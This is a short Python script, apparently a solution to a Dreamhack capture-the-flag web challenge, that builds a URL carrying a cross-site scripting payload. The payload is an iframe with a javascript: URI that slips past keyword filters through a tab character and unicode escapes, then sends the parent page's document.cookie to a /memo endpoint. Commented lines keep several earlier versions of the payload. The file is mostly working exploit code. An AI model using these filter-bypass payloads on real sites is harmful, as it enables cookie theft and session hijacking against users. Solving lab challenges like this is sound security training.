from ast import parse
from urllib import parse

URL = "http://host3.dreamhack.games:11032/vuln?param="
query = parse.quote(string="""<iframe src="javascri%09pt:parent.\u006cocati\u006fn.href='/memo?memo='%2Bparent.d\u006fcument.cookie"></iframe>""")
# <iframe src='javascript:location.href="/memo?memo="+document.cookie' />
# <iframe src='javascri%09pt:parent.\u006cocati\u006fn.href="/memo?memo="%2Bparent.d\u006fcument.cookie'></iframe>
# <iframe src="javascri%09pt:parent.\u006cocati\u006fn.href='/memo?memo='%2Bparent.d\u006fcument.cookie"></iframe>

# <iframe src="javascri	pt:parent.\u006cocati\u006fn.href='/memo?memo='+parent.d\u006fcument.cookie"></iframe>

# "/memo?memo="+document.cookie
print(URL + query)
